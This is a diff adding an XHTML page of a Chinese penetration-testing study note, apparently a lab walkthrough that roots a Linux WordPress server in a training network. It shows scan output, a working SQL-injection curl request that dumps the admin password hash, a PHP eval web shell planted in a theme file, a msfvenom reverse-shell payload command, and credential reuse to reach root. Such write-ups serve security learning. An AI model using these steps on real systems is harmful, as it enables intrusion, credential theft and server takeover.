@@ -1,0 +1,162 @@
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN"
+  "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<title>渗透测试学习笔记之案例四</title>
+<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
+</head>
+<body>
+<h1>渗透测试学习笔记之案例四</h1>
+<blockquote>原文：<a href="http://mp.weixin.qq.com/s?__biz=MzAwMzAwOTQ5Nw==&amp;mid=2650941245&amp;idx=1&amp;sn=95883fc9d80fcd8bdfe49f97d028dd88&amp;chksm=8137398bb640b09d35e7170a0c8dab7b5ce2eb73e0a8222b4f6cc50ee931acd0e8ac24ee19b3&amp;scene=126&amp;sessionid=1681663678#rd">http://mp.weixin.qq.com/s?__biz=MzAwMzAwOTQ5Nw==&amp;mid=2650941245&amp;idx=1&amp;sn=95883fc9d80fcd8bdfe49f97d028dd88&amp;chksm=8137398bb640b09d35e7170a0c8dab7b5ce2eb73e0a8222b4f6cc50ee931acd0e8ac24ee19b3&amp;scene=126&amp;sessionid=1681663678#rd</a></blockquote><p>
+		</p><h1><strong>0x00 前言</strong><br/></h1><p>
+	在前几篇文章中提到的案例大多数是针对Windows的渗透测试，今天笔者来继续分享一个针对Linux服务器的渗透案例。</p><h1><br/></h1><h1>
+	<strong>0x01 案例分析</strong><br/></h1><p>
+	</p><p>
+	<strong>实验环境：</strong></p><p>
+	<strong> </strong></p><ul class=" list-paddingleft-2"><li><p>
+		目标靶机：10.11.1.0/24	</p></li></ul><ul class=" list-paddingleft-2"><li><p>
+		攻击机：Kali Linux (10.11.0.204)	</p></li></ul><p>
+	<strong>渗透过程：</strong></p><p>今天我选择的目的机器是10.11.1.251，万年不变的nmap端口探测。</p><pre class="prettyprint lang-bsh"><span class="com"># nmap -Pn -sT 10.11.1.251</span><span class="pln"/><span class="typ">Starting</span><span class="pln"> </span><span class="typ">Nmap</span><span class="pln"> </span><span class="lit">7.50</span><span class="pln"> </span><span class="pun">(</span><span class="pln"> https</span><span class="pun">://</span><span class="pln">nmap</span><span class="pun">.</span><span class="pln">org </span><span class="pun">)</span><span class="pln"> at </span><span class="lit">2017</span><span class="pun">-</span><span class="lit">08</span><span class="pun">-</span><span class="lit">30</span><span class="pln"> </span><span class="lit">12</span><span class="pun">:</span><span class="lit">35</span><span class="pln"> CST</span><span class="typ">Nmap</span><span class="pln"> scan report </span><span class="kwd">for</span><span class="pln"> </span><span class="lit">10.11</span><span class="pun">.</span><span class="lit">1.251</span><span class="pln"/><span class="typ">Host</span><span class="pln"> is up </span><span class="pun">(</span><span class="lit">0.24s</span><span class="pln"> latency</span><span class="pun">).</span><span class="pln"/><span class="typ">Not</span><span class="pln"> shown</span><span class="pun">:</span><span class="pln"> </span><span class="lit">998</span><span class="pln"> filtered ports
+PORT   STATE SERVICE</span><span class="lit">22</span><span class="pun">/</span><span class="pln">tcp open  ssh</span><span class="lit">80</span><span class="pun">/</span><span class="pln">tcp open  http</span><span class="typ">Nmap</span><span class="pln"> </span><span class="kwd">done</span><span class="pun">:</span><span class="pln"> </span><span class="lit">1</span><span class="pln"> IP address </span><span class="pun">(</span><span class="lit">1</span><span class="pln"> host up</span><span class="pun">)</span><span class="pln"> scanned </span><span class="kwd">in</span><span class="pln"> </span><span class="lit">16.44</span><span class="pln"> seconds</span></pre><p>
+	这次好像没有前几次那么幸运了，扫描的结果信息非常有限：</p><ul class=" list-paddingleft-2"><li><p>
+		SSH服务开启在端口22上	</p></li><li><p>
+		HTTP服务开启在端口80上	</p></li></ul><p>
+	既然，HTTP服务是开启的，那么进行简单的扫描一下，web扫描器有很多，在此就不再赘述，笔者比较喜欢使用Kali下的一个轻量级的命令行下的web扫描器nikto。</p><p>
+	扫描结束发现，目标服务器上安装了wordpress。说到Wordpress，就不得不提到它的专属扫描器wpscan，废话不多说直接开扫。</p><p>
+	</p><pre class="prettyprint lang-bsh"><span class="com"># wpscan -u http://10.11.1.251/wp/ -eu</span><span class="pln">_______________________________________________________________
+        __          _______   _____
+        \ \        </span><span class="pun">/</span><span class="pln"> </span><span class="pun">/</span><span class="pln">  __ \ </span><span class="pun">/</span><span class="pln"> ____</span><span class="pun">|</span><span class="pln">
+         \ \  </span><span class="pun">/</span><span class="pln">\  </span><span class="pun">/</span><span class="pln"> </span><span class="pun">/|</span><span class="pln"> </span><span class="pun">|</span><span class="pln">__</span><span class="pun">)</span><span class="pln"> </span><span class="pun">|</span><span class="pln"> </span><span class="pun">(</span><span class="pln">___   ___  __ _ _ __ </span><span class="pun">®</span><span class="pln">
+          \ \/  \/ </span><span class="pun">/</span><span class="pln"> </span><span class="pun">|</span><span class="pln">  ___</span><span class="pun">/</span><span class="pln"> \___ \ </span><span class="pun">/</span><span class="pln"> __</span><span class="pun">|/</span><span class="pln"> _</span><span class="str">` | '_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 2.9.2
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+[i] It seems like you have not updated the database for some time.
+[?] Do you want to update now? [Y]es [N]o [A]bort, default: [N]
+[+] URL: http://10.11.1.251/wp/
+[+] Started: Sat Aug 12 10:48:07 2017
+
+[!] The WordPress 'http://10.11.1.251/wp/readme.html' file exists exposing a version number
+[!] Full Path Disclosure (FPD) in 'http://10.11.1.251/wp/wp-includes/rss-functions.php':
+[+] Interesting header: SERVER: Apache/2.2.11 (Ubuntu) PHP/5.2.6-3ubuntu4.4 with Suhosin-Patch
+[+] Interesting header: X-POWERED-BY: PHP/5.2.6-3ubuntu4.4
+[+] XML-RPC Interface available under: http://10.11.1.251/wp/xmlrpc.php
+[!] Includes directory has directory listing enabled: http://10.11.1.251/wp/wp-includes/
+
+[+] WordPress version 2.8.6 (Released on 2009-11-12) identified from advanced fingerprinting, meta generator, readme, links opml
+[!] 22 vulnerabilities identified from the version number
+
+… … 
+
+[!] Title: wp-forum - SQL Injection
+    Reference: https://wpvulndb.com/vulnerabilities/6732
+    Reference: http://cxsecurity.com/issue/WLB-2013020035
+
+[+] Finished: Sat Aug 12 10:49:15 2017
+[+] Requests Done: 72
+[+] Memory used: 43.27 MB
+[+] Elapsed time: 00:01:07
+
+[+] Enumerating usernames ...
+[+] Identified the following 1 user/s:
+    +----+-------+-------+
+    | Id | Login | Name  |
+    +----+-------+-------+
+    | 1  | admin | admin |
+    +----+-------+-------+
+[!] Default first WordPress username 'admin' is still used</span></pre><p>整理结果，发现以下可用的信息：</p><p>
+	</p><ul class=" list-paddingleft-2"><li><p>
+		目标服务器安装了WordPress 2.8.6	</p></li><li><p>
+		且安装了存在SQL注入的wp-forum插件，POC地址：http://cxsecurity.com/issue/WLB-2013020035</p></li><li><p>
+		存在用户名admin	</p></li></ul><p>
+	验证是否存在SQL注入：</p><p>
+	</p><pre class="prettyprint lang-bsh"><span class="com"># curl -L "http://10.11.1.251/wp/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+selectroup_concat%28user_login,0x3a,user_pass%29+from+wp_users%23"</span><span class="pln"/><span class="pun">&lt;?</span><span class="pln">xml version</span><span class="pun">=</span><span class="str">"1.0"</span><span class="pln"> encoding</span><span class="pun">=</span><span class="str">"UTF-8"</span><span class="pun">?&gt;</span><span class="pln">
+		</span><span class="pun">&lt;</span><span class="pln">rss version</span><span class="pun">=</span><span class="str">"2.0"</span><span class="pln"> xmlns</span><span class="pun">:</span><span class="pln">atom</span><span class="pun">=</span><span class="str">"http://www.w3.org/2005/Atom"</span><span class="pun">&gt;</span><span class="pln">
+		</span><span class="pun">&lt;</span><span class="pln">channel</span><span class="pun">&gt;</span><span class="pln">
+		</span><span class="pun">&lt;</span><span class="pln">title</span><span class="pun">&gt;</span><span class="typ">Shakan</span><span class="pln"> </span><span class="typ">Ltd</span><span class="pln"> </span><span class="typ">Forum</span><span class="pln"> </span><span class="pun">-</span><span class="pln"> </span><span class="typ">Topic</span><span class="pun">:</span><span class="pln">  admin</span><span class="pun">:</span><span class="pln">$P$B9wJdX0NkO95U2L</span><span class="pun">.</span><span class="pln">kqAGXsFufwSp5N1 </span><span class="pun">&lt;/</span><span class="pln">title</span><span class="pun">&gt;</span><span class="pln">
+		</span><span class="pun">&lt;</span><span class="pln">description</span><span class="pun">&gt;</span><span class="typ">Shakan</span><span class="pln"> </span><span class="typ">Ltd</span><span class="pln"> </span><span class="typ">Forum</span><span class="pln"> </span><span class="typ">Topic</span><span class="pun">:</span><span class="pln"> </span><span class="pun">-</span><span class="pln"> admin</span><span class="pun">:</span><span class="pln">$P$B9wJdX0NkO95U2L</span><span class="pun">.</span><span class="pln">kqAGXsFufwSp5N1</span><span class="pun">&lt;/</span><span class="pln">description</span><span class="pun">&gt;</span><span class="pln">
+		</span><span class="pun">&lt;</span><span class="pln">link</span><span class="pun">&gt;&lt;/</span><span class="pln">link</span><span class="pun">&gt;</span><span class="pln">
+		</span><span class="pun">&lt;</span><span class="pln">language</span><span class="pun">&gt;</span><span class="pln">en</span><span class="pun">-</span><span class="pln">US</span><span class="pun">&lt;/</span><span class="pln">language</span><span class="pun">&gt;</span><span class="pln">
+				</span><span class="pun">&lt;/</span><span class="pln">channel</span><span class="pun">&gt;</span><span class="pln">
+		</span><span class="pun">&lt;/</span><span class="pln">rss</span><span class="pun">&gt;</span></pre><p>获得了用户名为admin的密码哈希：</p><pre class="prettyprint lang-bsh"><span class="pln">$P$B9wJdX0NkO95U2L</span><span class="pun">.</span><span class="pln">kqAGXsFufwSp5N1</span></pre><p>通过在线Hash破解网站https://www.onlinehashcrack.com/破解得到wordpress的用户名和密码分别为：</p><pre class="prettyprint lang-bsh"><span class="pln">admin</span><span class="pun">/?????</span></pre><p>接下来的操作就是登录wordpress后台获取webshell了。</p><p>
+	</p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAP4zVSqzyMWBdrcqGdTpg6K6pQmibjk5CKPI4j4kgmfHLGZa96DKrLiaqA/0?wx_fmt=png" class="" data-ratio="0.7931428571428571" data-w="875" data-type="png" src="../Images/ebc072413f5efdce0aa3cda1029a1295.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAP4zVSqzyMWBdrcqGdTpg6K6pQmibjk5CKPI4j4kgmfHLGZa96DKrLiaqA/0?wx_fmt=png"/></p><p>
+	具体操作步骤如下：</p><ol class=" list-paddingleft-2"><li><p>
+		用上面获取的用户名和密码登录后台http://10.11.1.251/wp/wp-admin</p></li><li><p>
+		依次打开<span style=" font-size:12.0pt ; "/>Appearance -&gt; Editor -&gt; Main Index Template (index.php)	</p></li><li><p>
+		插入php的一句话木马“&lt;?php @eval($_POST[‘cmd’]); ?&gt;”并点击保存	</p></li><li><p>
+		打开菜刀并建立一句话木马http://10.11.1.251/wp/index.php<br/></p></li><li><p>
+		最后，成功获得了webshell	</p></li></ol><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPtm4yTzaClmsJoHWgTTbJYgmTjv0V7H9oNkxmYVtGPorMS4uQga0ib3g/0?wx_fmt=png" class="" data-ratio="0.7917189460476788" data-w="797" data-type="png" src="../Images/0f2cf1b3c3878f7b65b5e6cc17bc6f84.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPtm4yTzaClmsJoHWgTTbJYgmTjv0V7H9oNkxmYVtGPorMS4uQga0ib3g/0?wx_fmt=png"/></p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPe5aySD0CgPK3WzD8wsYVgXNq9IkFaLV4jbB1Y5z8ia61cL6fg6ZUz9A/0?wx_fmt=png" class="" data-type="png" data-ratio="0.7826633165829145" data-w="796" src="../Images/4d19bb0e9acab7ecc15984c12b0b4fa2.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPe5aySD0CgPK3WzD8wsYVgXNq9IkFaLV4jbB1Y5z8ia61cL6fg6ZUz9A/0?wx_fmt=png"/></p><p>
+	有了webshell接下来我们要思考的问题，尽可能多地搜集信息为后面可能的提权做准备。</p><ul class=" list-paddingleft-2"><li><p>
+		搜集操作系统信息	</p></li><li><p>
+		搜集当前用户和权限信息	</p></li><li><p>
+		搜集当前服务器的网络信息	</p></li><li><p>
+		等等	</p></li></ul><p>
+	<span style="color:#E53333;"><strong>注：这里有一些常见的Linux信息搜集命令以便提权：https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</strong></span></p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPtI4qQx7tBicSrVK3rkjicZrAoEDUQt0ib8b1hmMiaMrXZbxzG6fHL68TDA/0?wx_fmt=png" class="" data-ratio="0.7878787878787878" data-w="792" data-type="png" src="../Images/62c69215c74967930546dcdbc6a543e7.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPtI4qQx7tBicSrVK3rkjicZrAoEDUQt0ib8b1hmMiaMrXZbxzG6fHL68TDA/0?wx_fmt=png"/></p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPjIoyyfApC56ovkbypcuVvYvnymkTz919pZMnFtMebTNgJykzzFyyRA/0?wx_fmt=png" class="" data-ratio="0.7929292929292929" data-w="792" data-type="png" src="../Images/5aa4f4b16ce057333ac249143e6265c7.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPjIoyyfApC56ovkbypcuVvYvnymkTz919pZMnFtMebTNgJykzzFyyRA/0?wx_fmt=png"/></p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPTb4NwL5yrKgGEzU55VmJV2GohiaHoJGhG2xQHChWm1rwuluoOtWxSYw/0?wx_fmt=png" class="" data-type="png" data-ratio="0.7987421383647799" data-w="795" src="../Images/b3408aed07d440a04e07be1c0bd27e00.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPTb4NwL5yrKgGEzU55VmJV2GohiaHoJGhG2xQHChWm1rwuluoOtWxSYw/0?wx_fmt=png"/></p><p>
+	整理一下我们搜集到的信息：</p><ul class=" list-paddingleft-2"><li><p>
+		操作系统：32位的Linux sean 2.6.28-11-generic #42-Ubuntu SMP Fri Apr 17 (Ubuntu 9.04)	</p></li><li><p>
+		主机名：sean	</p></li><li><p>
+		有意思的用户名：sean （猜测可能是系统管理员的账户）	</p></li><li><p>
+		网络信息：主机貌似存在2个vlan(分别是10.11.1.251/24和10.1.1.246/24)	</p></li><li><p>
+		服务信息：安装了并运行了mysql	</p></li></ul><p>
+	同时，通过浏览wordpress的wp-config.php文件，我们也找到了下面的数据库连接信息，如下：</p><ul class=" list-paddingleft-2"><li><p>
+		DB Name: wp	</p></li><li><p>
+		DB User: root	</p></li><li><p>
+		DB Password: toor	</p></li><li><p>
+		DB Host: localhost	</p></li><li><p>
+		DB Port: 3306	</p></li></ul><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPB0XmYzicyv25vUzSWXZGBociab4te5bnStfdJvqBl9ESfdqPx7eklffQ/0?wx_fmt=png" class="" data-ratio="0.7969735182849937" data-w="793" data-type="png" src="../Images/9a1b96054cd975aa710271440eb39a1d.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPB0XmYzicyv25vUzSWXZGBociab4te5bnStfdJvqBl9ESfdqPx7eklffQ/0?wx_fmt=png"/></p><p>
+	有了上面一系列的信息，我们现在的思路有以下几个：</p><ol class=" list-paddingleft-2"><li><p>
+		获取更加稳定的meterpreter连接再提权获取root权限	</p></li><li><p>
+		尝试利用已知的用户和密码登录目标服务器再尝试提权	</p></li></ol><p>
+	先说说思路一，我们首先生成一个meterpreter的payload，比如：</p><p>
+	</p><pre class="prettyprint lang-js"><span class="pln">msfvenom </span><span class="pun">-</span><span class="pln">p linux</span><span class="pun">/</span><span class="pln">x86</span><span class="pun">/</span><span class="pln">meterpreter</span><span class="pun">/</span><span class="pln">reverse_tcp LHOST</span><span class="pun">=&lt;你的监听主机</span><span class="pln">IP</span><span class="pun">&gt;</span><span class="pln"> LPORT</span><span class="pun">=&lt;你的监听端口&gt;</span><span class="pln"> </span><span class="pun">-</span><span class="pln">f elf </span><span class="pun">-</span><span class="pln">a x86 </span><span class="pun">--</span><span class="pln">platform linux </span><span class="pun">-</span><span class="pln">o </span><span class="pun">&lt;生成的</span><span class="pln">meterpreter payload</span><span class="pun">文件名&gt;</span></pre><p>接着我们将该payload通过webshell上传到目标服务器上。</p><p>
+	</p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAP6M2XZgxqEgvyQ9MQGBKibsbhwric9I4IvANwdfBViawxiccicoChvBOov6g/0?wx_fmt=png" class="" data-ratio="0.7939317319848294" data-w="791" data-type="png" src="../Images/a44aa04a886a4711393c260cb75272d3.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAP6M2XZgxqEgvyQ9MQGBKibsbhwric9I4IvANwdfBViawxiccicoChvBOov6g/0?wx_fmt=png"/></p><p>
+	在MSF中开启监听并在目标机器上执行payload来获取meterpreter连接。</p><p>
+	</p><p><img data-s="300,640" data-type="png" data-src="https://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAP9icKjXalUsrOkmoibaiacAjFXENibX0FlfCjhYrqE4Gz8AUfexmRNBrXmA/0?wx_fmt=png" class="" data-ratio="0.45592363840539024" data-w="1781" src="../Images/54dba56ca3c2b3468c3ede1e0152d996.png" data-original-src="https://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAP9icKjXalUsrOkmoibaiacAjFXENibX0FlfCjhYrqE4Gz8AUfexmRNBrXmA/0?wx_fmt=png"/></p><p>之后，我们便可以通过shell命令在meterpreter中获取目标服务器的shell。而在shell中执行如下命令便可以获得一个完全交互式的shell。</p><p>
+	</p><pre class="prettyprint lang-bsh"><span class="pln">python </span><span class="pun">-</span><span class="pln">c </span><span class="str">'import pty; pty.spawn("/bin/bash")'</span></pre><p>
+	</p><p>
+	<span style="color:#E53333;"><strong>注：更多的获取完全交互式shell的方法可以参考</strong></span><span style="color:#E53333;"><strong>https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</strong></span></p><p>
+	有了交互式的shell，我们便可以实施我们的提权操作了，这里推荐几个笔者觉得不错的Linux提权工具或者资源：</p><ul class=" list-paddingleft-2"><li><p>
+		LinEnum.sh</p></li><li><p>
+		linux-kernel-exploits</p></li><li><p>
+		linuxprivchecker.py</p></li><li><p>
+		RootHelper</p></li></ul><p>
+	思路一通常是最常见的提权过程，但是思路二往往却可以达到事办功倍的效果。</p><p>
+	根据上面的信息，我们发现了一个很有意思的系统账户sean, 
+其于目标机器的主机名一致，很有可能就是该机器的系统管理员账户，那么如果我们可以知道它的密码岂不是可以轻松SSH登录到目标服务器上。我们已经知道wordpress的后台管理员密码是?????，那么有没有可能系统管理员也使用了同样的密码呢？</p><p>
+	于是，我们尝试用用户名sean和密码?????来登录一下目标主机，如下：</p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPjAHqOapWkrAYRkI7Td0cFFeZadlAQyshxaRUaewFEe2xcu31f3eMVg/0?wx_fmt=png" class="" data-type="png" data-ratio="0.7603734439834025" data-w="964" src="../Images/b28be978bd26412f7ba12ee96a0c4e05.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPjAHqOapWkrAYRkI7Td0cFFeZadlAQyshxaRUaewFEe2xcu31f3eMVg/0?wx_fmt=png"/></p><p>
+	果然，该账户使用了同样的密码，而我们也成功地SSH登录了目标主机。既然登录了，当然首先要检查一下我们的账户是否具有sudo权限。</p><p>
+	<img data-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPAtJxRiafqPibR8ibyIRibM220OibuWtpT5EhpNK4n4KQbe6pBmTWFNDd0YQ/0?wx_fmt=png" class="" data-type="png" data-ratio="0.47497446373850866" data-w="979" src="../Images/3c3f74a401f68dc53e8ef17b0684d716.png" data-original-src="http://mmbiz.qpic.cn/mmbiz_png/4WwicSnkicVGcnicu1QyroWib2iarnib3OicuAPAtJxRiafqPibR8ibyIRibM220OibuWtpT5EhpNK4n4KQbe6pBmTWFNDd0YQ/0?wx_fmt=png"/></p><p>
+	最终，我们成功地在目标主机上获得了root权限。</p><h1><br/></h1><h1>
+	<strong>0x02 小结</strong><br/></h1><p>
+	总结一下本案例的渗透过程：</p><ol class=" list-paddingleft-2"><li><p>
+		nmap进行端口探测	</p></li><li><p>
+		发现http服务并进行web扫描	</p></li><li><p>
+		发现Wordpress插件的SQL注入漏洞并获得网站管理员账户的密码hash	</p></li><li><p>
+		破解密码hash登录后台获取webshell	</p></li><li><p>
+		继续搜集信息并猜测系统管理员的账号密码 （或者，继续搜集信息并实施本地提权从而获得root权限）	</p></li><li><p>
+		利用猜测的密码远程登录主机并获取root权限	</p></li></ol><h1><br/></h1><h1>
+	<strong>0x03 参考</strong><br/></h1><ul class=" list-paddingleft-2"><li><p>
+		https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</p></li><li><p>
+		https://www.onlinehashcrack.com/</p></li><li><p>
+		https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</p></li><li><p>
+			https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh</p></li></ul><p><br/></p><p style="margin-top: 5px; margin-bottom: 5px; white-space: normal; font-family: sans-serif; line-height: normal;">---<br/></p><p style="margin-top: 5px; margin-bottom: 5px; white-space: normal; font-family: sans-serif; line-height: normal;">查询和订阅最新安全事件，请关注”安全小飞侠“吧！</p><p style="margin-top: 5px; margin-bottom: 5px; white-space: normal; font-family: sans-serif; line-height: normal;"><img data-w="1280" data-ratio="1" data-s="300,640" data-type="jpeg" data-src="http://mmbiz.qpic.cn/mmbiz/4WwicSnkicVGcA2LKqs7rVATosYQJcXIts04XvpPGd1rUPVx81kTliaGkBcv1cNmzKdcEfoYKeY6SRIYUZlpgnFvA/0?wx_fmt=jpeg" class="" src="../Images/c978ac3c90ff4cfb11cee8a135dbf6fa.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/4WwicSnkicVGcA2LKqs7rVATosYQJcXIts04XvpPGd1rUPVx81kTliaGkBcv1cNmzKdcEfoYKeY6SRIYUZlpgnFvA/0?wx_fmt=jpeg"/></p><p style="border: 0px; font-family: Lato, sans-serif; margin-bottom: 24px; outline: 0px; vertical-align: baseline; color: rgb(43, 43, 43); line-height: 24px; white-space: normal;"><br/></p>
+        
+</body>
+</html>
